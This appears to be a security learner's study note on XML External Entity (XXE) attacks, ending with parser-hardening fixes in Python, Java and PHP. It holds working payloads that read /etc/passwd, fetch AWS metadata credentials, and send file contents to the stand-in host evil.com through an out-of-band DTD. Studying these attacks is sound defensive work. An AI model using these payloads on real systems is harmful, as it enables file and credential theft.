# XXE (XML External Entities)
Tags: #vulnerability #xxe #xml #injection #ssrf #day5

## What is XXE and why does it exist?

XML entities are variables — define a value once, reuse it throughout the document:

```xml
<!DOCTYPE note [
  <!ENTITY company "Acme Corporation">
]>
<note>
  <from>&company;</from>
</note>
```

The parser replaces `&company;` with "Acme Corporation." That's an **internal entity** — value defined inline.

An **external entity** points to an external source instead:

```xml
<!ENTITY xxe SYSTEM "file:///etc/passwd">
```

The parser reads this and fetches `/etc/passwd`, substituting the contents wherever `&xxe;` appears. The parser is doing exactly what it was designed to do — resolve entities. The problem is the user controls what the entity points to.

XXE is essentially **SSRF through the XML parser** — the server fetches whatever resource the attacker specifies. But it also gives you **local file reading** (like path traversal) through `file://` URIs. Two capabilities through one feature.

## How does a basic XXE attack work?

Application accepts XML for a profile update:

```xml
<?xml version="1.0"?>
<profile>
  <name>John</name>
  <email>john@example.com</email>
</profile>
```

Attacker modifies it:

```xml
<?xml version="1.0"?>
<!DOCTYPE profile [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<profile>
  <name>John</name>
  <email>&xxe;</email>
</profile>
```

Step by step: parser reads DOCTYPE, sees entity pointing to `file:///etc/passwd` → encounters `&xxe;` in email field → fetches the file → substitutes contents into email field → application echoes it back → attacker reads `/etc/passwd` in the response.

For SSRF — same mechanism, different URI:

```xml
<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/">
```

AWS credentials displayed in the response. For internal port scanning: fast response = port open, timeout = port closed.

## How does blind/OOB XXE work when there's no response?

You can't nest entity resolution directly (`"http://evil.com/?data=file:///etc/passwd"` doesn't work). You need a two-stage approach using **parameter entities**:

**Stage 1** — host a malicious DTD on your server (`https://evil.com/xxe.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/passwd">
<!ENTITY % exfil "<!ENTITY send SYSTEM 'http://evil.com/steal?data=%file;'>">
%exfil;
```

**Stage 2** — make the target load your DTD:

```xml
<?xml version="1.0"?>
<!DOCTYPE profile [
  <!ENTITY % dtd SYSTEM "http://evil.com/xxe.dtd">
  %dtd;
]>
<profile>
  <name>&send;</name>
</profile>
```

What happens: parser fetches your DTD → your DTD reads `/etc/passwd` into `%file;` → constructs `&send;` with file contents embedded in the URL → parser resolves `&send;` → your server receives the file contents in the query string.

Why two stages? XML restricts referencing parameter entities inside the same internal DTD where they're defined. Loading an external DTD bypasses this restriction.

## Where does XXE hide in real applications?

**Obvious XML endpoints:**
- SOAP APIs — entirely XML-based, still widespread in enterprise/banking/government
- REST APIs that accept XML — change `Content-Type: application/json` to `application/xml` and send XML. Many servers have XML parsers enabled even when docs only mention JSON

**File uploads that are secretly XML:**

| Format | Why it's XML |
|---|---|
| DOCX, XLSX, PPTX | ZIP files containing XML — server unzips and parses `word/document.xml` |
| SVG | XML-based image format — upload as profile picture with XXE payload |
| SAML | Authentication tokens are XML — XXE in SSO can compromise entire auth system |

**Hidden XML processing:**
- RSS/Atom feed parsers, sitemap processors
- File metadata extraction (EXIF data via XML parser)
- XML-based config file uploads
- GPX files (GPS data)

**Content-Type swap test:** Even if an endpoint expects JSON, try:

```
Content-Type: application/xml

<?xml version="1.0"?>
<!DOCTYPE test [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<name>&xxe;</name>
```

Many frameworks have XML parsers enabled by default even when not documented.

## Why does XML still exist if JSON replaced it?

XML was created in 1998 — before JSON. It's self-describing, platform-independent, and validatable with schemas (XSD). JSON was simpler and won for modern web APIs, but XML is deeply embedded in systems that can't easily migrate:

- **Banking/finance** — core banking APIs, SWIFT network, payment processing. Migrating costs millions.
- **Healthcare** — HL7/FHIR standards for health records, insurance claims.
- **Government** — tax filing (IRS), procurement portals, inter-agency exchange.
- **SAML/SSO** — every corporate "Sign in with your company account" passes XML authentication assertions. Millions of logins daily.
- **Office documents** — every DOCX/XLSX/PPTX is a ZIP of XML files. Billions of XML parsing operations daily.
- **Java ecosystem** — `web.xml`, `pom.xml`, Spring configuration, Tomcat config.
- **Android** — layouts and `AndroidManifest.xml` are XML.
- **Payment processing** — credit card transactions flow as XML between merchant, processor, and bank.

Behind every modern JSON API there are often legacy XML systems:

```
Modern app → JSON API → Backend → SOAP/XML → Legacy banking
                                → SAML/XML → SSO provider
                                → DOCX upload → XML parser
```

The developer building the JSON API might not know their application parses XML somewhere in the chain. That's why XXE keeps appearing — someone uploads a DOCX, SVG, or swaps Content-Type, and an XML parser nobody thought about processes attacker-controlled input.

## How do you fix XXE?

**1. Disable external entities and DTDs entirely.** This is the primary fix — if the parser won't resolve entities, XXE is dead.

```python
# Python (lxml)
parser = etree.XMLParser(resolve_entities=False, no_network=True)
```

```java
// Java
factory.setFeature("http://apache.org/xml/features/disallow-doctype-decl", true);
```

```php
// PHP
libxml_disable_entity_loader(true);
```

**2. Use JSON instead of XML.** If you don't need XML features, don't accept it. Remove XML parsers from dependencies.

**3. Strip DOCTYPE declarations** from incoming XML before parsing.

**4. Update XML libraries.** Modern parsers disable external entities by default. Older versions don't.

## My Notes
